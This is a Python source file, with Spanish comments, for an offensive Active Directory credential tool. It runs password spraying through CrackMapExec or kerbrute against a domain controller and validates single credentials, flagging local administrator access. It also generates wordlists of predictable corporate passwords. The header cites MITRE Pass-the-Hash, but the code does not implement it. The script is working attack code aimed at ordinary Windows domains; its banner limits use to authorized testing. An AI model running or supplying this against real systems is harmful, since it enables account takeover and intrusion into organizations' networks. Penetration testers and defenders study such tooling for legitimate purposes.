#!/usr/bin/env python3
"""
credential_attack.py — Ataques de credenciales en Active Directory
MITRE ATT&CK: T1110.003 (Password Spraying) · T1550.002 (Pass-the-Hash)

Uso:
    # Password spraying
    python3 credential_attack.py spray --dc 192.168.1.10 --domain empresa.local \
        --users usuarios.txt --password "Empresa2024!"

    # Verificar una credencial
    python3 credential_attack.py check --dc 192.168.1.10 --domain empresa.local \
        -u juan -p "Password123!"

    # Generar lista de contraseñas corporativas típicas
    python3 credential_attack.py wordlist --company "Empresa" --year 2024
"""

import argparse
import subprocess
import sys
import time
from datetime import datetime


class C:
    RED = "\033[91m"; GREEN = "\033[92m"; YELLOW = "\033[93m"
    BLUE = "\033[94m"; CYAN = "\033[96m"; BOLD = "\033[1m"; RESET = "\033[0m"

def ok(m):  print(C.GREEN  + "  [+] " + C.RESET + m)
def info(m): print(C.BLUE  + "  [*] " + C.RESET + m)
def warn(m): print(C.YELLOW + "  [!] " + C.RESET + m)
def err(m):  print(C.RED   + "  [-] " + C.RESET + m)


def banner():
    print(C.RED + C.BOLD + """
  ╔══════════════════════════════════════════════════╗
  ║   CREDENTIAL ATTACK — Password Spray & PTH       ║
  ║   Solo en entornos con autorización expresa       ║
  ╚══════════════════════════════════════════════════╝
""" + C.RESET)


def cmd_spray(args):
    """Password Spraying — prueba una contraseña contra muchos usuarios."""
    info("Cargando lista de usuarios: " + args.users)
    try:
        with open(args.users) as f:
            users = [l.strip() for l in f if l.strip()]
    except FileNotFoundError:
        err("Archivo no encontrado: " + args.users)
        sys.exit(1)

    info("Usuarios cargados: " + str(len(users)))
    info("Contraseña a probar: " + args.password)
    warn("Usando CrackMapExec para spraying...")
    print()

    # Guardar usuarios en archivo temporal
    tmp_users = "/tmp/spray_users_" + datetime.now().strftime("%H%M%S") + ".txt"
    with open(tmp_users, "w") as f:
        f.write("\n".join(users))

    cmd = [
        "crackmapexec", "smb", args.dc,
        "-u", tmp_users,
        "-p", args.password,
        "-d", args.domain,
        "--continue-on-success",
    ]

    info("Comando: " + " ".join(cmd).replace(args.password, "***"))
    print()

    try:
        result = subprocess.run(cmd, text=True, capture_output=True)
        output = result.stdout + result.stderr

        valid = [l for l in output.split("\n") if "[+]" in l]
        failed = [l for l in output.split("\n") if "[-]" in l]

        print(output)

        if valid:
            print()
            ok("CREDENCIALES VALIDAS ENCONTRADAS:")
            for v in valid:
                ok(v.strip())
        else:
            warn("No se encontraron credenciales validas con: " + args.password)
            info("Siguiente paso: probar otra contrasena o usar reglas de mutacion")

    except FileNotFoundError:
        err("CrackMapExec no encontrado. Instalar: apt install crackmapexec")
        info("Alternativa con kerbrute:")
        print("  kerbrute passwordspray -d " + args.domain +
              " --dc " + args.dc + " " + args.users + " '" + args.password + "'")


def cmd_check(args):
    """Verifica si unas credenciales son validas en el dominio."""
    info("Verificando: " + args.domain + "/" + args.user)

    cmd = ["crackmapexec", "smb", args.dc,
           "-u", args.user, "-p", args.password, "-d", args.domain]

    try:
        result = subprocess.run(cmd, text=True, capture_output=True)
        output = result.stdout + result.stderr
        print(output)

        if "[+]" in output:
            ok("Credenciales VALIDAS: " + args.user + ":" + args.password)
            # Comprobar si es admin
            if "(Pwn3d!)" in output:
                ok("El usuario tiene PRIVILEGIOS DE ADMINISTRADOR LOCAL")
        else:
            warn("Credenciales no validas o cuenta bloqueada")

    except FileNotFoundError:
        err("CrackMapExec no encontrado")


def cmd_wordlist(args):
    """Genera una wordlist de contrasenas corporativas tipicas."""
    company = args.company
    year    = args.year
    output  = args.output or "corp_passwords.txt"

    patterns = []
    months_es = ["Enero","Febrero","Marzo","Abril","Mayo","Junio",
                 "Julio","Agosto","Septiembre","Octubre","Noviembre","Diciembre"]
    months_en = ["January","February","March","April","May","June",
                 "July","August","September","October","November","December"]

    # Patrones por empresa
    for variant in [company, company.lower(), company.upper(), company.capitalize()]:
        for y in [str(year), str(year)[-2:], str(year+1), str(year-1)]:
            for suffix in ["!", "@", "#", "1", "123", "1234", "12345"]:
                patterns.append(variant + y + suffix)
                patterns.append(variant + suffix + y)

    # Patrones por mes
    for month in months_es + months_en:
        for y in [str(year), str(year)[-2:]]:
            patterns.append(month + y + "!")
            patterns.append(month + y + "@")
            patterns.append(month + "@" + y)

    # Patrones genéricos
    generics = [
        "Password1!", "Password123!", "Welcome1!", "Welcome123!",
        "Bienvenido1!", "Bienvenido123!", "Admin123!", "Summer" + str(year) + "!",
        "Winter" + str(year) + "!", "Spring" + str(year) + "!", "Fall" + str(year) + "!",
        "Verano" + str(year) + "!", "Invierno" + str(year) + "!",
        "Changeme1!", "Changeme123!", "P@ssword1", "P@ssw0rd",
        "Passw0rd!", "Qwerty123!", "123456789!", company + "123!",
    ]
    patterns.extend(generics)

    # Eliminar duplicados manteniendo orden
    seen = set()
    unique = []
    for p in patterns:
        if p not in seen:
            seen.add(p)
            unique.append(p)

    with open(output, "w") as f:
        f.write("\n".join(unique))

    ok("Wordlist generada: " + output + " (" + str(len(unique)) + " contrasenas)")
    info("Usar con: crackmapexec smb DC -u users.txt -p " + output + " --continue-on-success")


def parse_args():
    p = argparse.ArgumentParser(description="credential_attack.py — Ataques de credenciales AD")
    sub = p.add_subparsers(dest="command", required=True)

    # spray
    sp = sub.add_parser("spray", help="Password spraying")
    sp.add_argument("--dc",       required=True)
    sp.add_argument("--domain",   required=True)
    sp.add_argument("--users",    required=True, help="Archivo con lista de usuarios")
    sp.add_argument("--password", required=True, help="Contrasena a probar")

    # check
    ch = sub.add_parser("check", help="Verificar credencial")
    ch.add_argument("--dc",     required=True)
    ch.add_argument("--domain", required=True)
    ch.add_argument("-u", "--user",     required=True)
    ch.add_argument("-p", "--password", required=True)

    # wordlist
    wl = sub.add_parser("wordlist", help="Generar wordlist corporativa")
    wl.add_argument("--company", required=True, help="Nombre de la empresa")
    wl.add_argument("--year",    default=2024,  type=int)
    wl.add_argument("--output",  default=None)

    return p.parse_args()


def main():
    banner()
    args = parse_args()
    if args.command == "spray":    cmd_spray(args)
    elif args.command == "check":  cmd_check(args)
    elif args.command == "wordlist": cmd_wordlist(args)

if __name__ == "__main__":
    main()
